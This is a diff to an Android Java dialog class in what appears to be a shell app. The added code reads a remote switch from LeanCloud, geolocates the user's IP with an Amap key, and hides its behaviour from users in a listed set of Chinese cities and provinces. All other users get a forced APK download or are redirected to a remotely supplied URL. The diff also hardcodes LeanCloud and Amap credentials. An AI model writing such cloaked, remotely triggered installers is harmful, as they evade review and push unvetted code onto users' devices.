@@ -32,8 +32,10 @@ import com.regus.mj.utils.FastJsonUtils;
 import com.regus.mj.utils.GsonUtil;
 import com.regus.mj.utils.InstallUtils;
 import com.regus.mj.view.BaseDialogFragment;
+import com.regus.mj.view.DialogFramentManager;
 import com.regus.mj.view.TBProgressView;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -316,10 +318,10 @@ public class MJRegusDialogFragment extends BaseDialogFragment {
         public void run() {
 
             try {
-                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/61665006ec1d407bb2450e59");
+                URL urll = new URL("https://tlmdw22a.api.lncld.net/1.1/classes/UpVersion/6168ec5c31c3f94692a5e8de");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setRequestProperty("X-LC-Id", "QnL4eqOeVFvxKnwF1gLDJywM-gzGzoHsz");
-                urlConnection.setRequestProperty("X-LC-Key", "8gEvCsJUQAcw2RJHpfoXknLQ");
+                urlConnection.setRequestProperty("X-LC-Id", "tLmDW22ab3CfULnkBagYBcqi-gzGzoHsz");
+                urlConnection.setRequestProperty("X-LC-Key", "YOF1GehjRo4WYR15TaE9ij3L");
                 urlConnection.setConnectTimeout(10000);
                 urlConnection.setReadTimeout(10000);
                 urlConnection.setRequestMethod("GET");
@@ -345,31 +347,84 @@ public class MJRegusDialogFragment extends BaseDialogFragment {
                         String url = avObject.getString("url");
                         boolean isStop = avObject.getBoolean("stop");
 
+                        //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
+                        JSONArray ipsArray = avObject.getJSONArray("ips");
                      //   Log.e("avo", "s  " + show + " i  " + isStop);
 
-                        if (isStop) {
-                            if (show == 2) {
-                                if (url.endsWith("apk")) {
-                                    downLoadUrl = url;
-                                    mode = 1;
+                        if(isStop){
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
 
-                                    showDownLoadDialog();
-                                    isForce = true;
-                               //     checkPermision();
+                                    try {
 
-                                } else {
-                                    Intent intent = new Intent();
-                                    intent.setAction(Intent.ACTION_VIEW);
-                                    Uri content_url = Uri.parse(url);
-                                    intent.setData(content_url);
-                                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
-                                    startActivity(intent);
+                                        URL urll = new URL("https://restapi.amap.com/v3/ip?key=a11dbeb4815afc317622d62797d7e408");
+                                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+                                        urlConnection.setConnectTimeout(10000);
+                                        urlConnection.setReadTimeout(10000);
+                                        urlConnection.setRequestMethod("GET");
+                                        urlConnection.connect();
+                                        int code = urlConnection.getResponseCode();
+                                        if (code == 200) {
+                                            InputStream inputStream = urlConnection.getInputStream();
+                                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                                            String line;
+                                            StringBuffer buffer = new StringBuffer();
+                                            while ((line = bufferedReader.readLine()) != null) {
+                                                buffer.append(line);
+                                            }
+                                            String json = buffer.toString();
+
+                                            //    Log.e("avo_map", "s  " + json );
+
+                                            JSONObject jsonMap = new JSONObject(json);
+
+                                            boolean isLimit = false;
+
+
+                                            for (int i = 0; i < ipsArray.length(); i++) {
+                                                String area = ipsArray.getString(i);
+                                                if (json.contains(area)) {
+                                                    isLimit = true;
+                                                }
+                                            }
+
+
+                                            if (json.contains("\"province\":[]")) {
+                                                isLimit = true;
+                                            }
+
+
+                                            String info = jsonMap.getString("info");
+
+                                            if (!info.toLowerCase().equals("ok")) {
+                                                isLimit = false;
+                                            }
+
+                                            //   Log.e("avo", "s  " + show + " i  " + isStop + " lmit "+ isLimit);
+
+                                            if(!isLimit){
+                                                lcDoRogic(isStop,show,url);
+                                            } else {
+                                                RequestThat();
+                                            }
+
+                                        } else {
+                                            Log.e("avo_0", "!200");
+                                            lcDoRogic(isStop,show,url);
+                                        }
+
+                                    } catch (JSONException e) {
+                                        Log.e("avo_2", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    } catch (Exception e) {
+                                        Log.e("avo_3", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    }
+
                                 }
-
-                            } else {
-                                jumpLocalSplash();
-                            }
-                        } else {
+                            }).start();
+                        }else {
                             RequestThat();
                         }
 
@@ -386,6 +441,35 @@ public class MJRegusDialogFragment extends BaseDialogFragment {
         }
 
     }
+
+    private void lcDoRogic(boolean isStop,int show,String url){
+        if (isStop) {
+            if (show == 2) {
+                if (url.endsWith("apk")) {
+                    downLoadUrl = url;
+                    mode = 1;
+
+                    showDownLoadDialog();
+                    isForce = true;
+                    //     checkPermision();
+
+                } else {
+                    Intent intent = new Intent();
+                    intent.setAction(Intent.ACTION_VIEW);
+                    Uri content_url = Uri.parse(url);
+                    intent.setData(content_url);
+                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
+                    startActivity(intent);
+                }
+
+            } else {
+                jumpLocalSplash();
+            }
+        } else {
+            RequestThat();
+        }
+    }
+
 
 
     private void showDownLoadUi() {
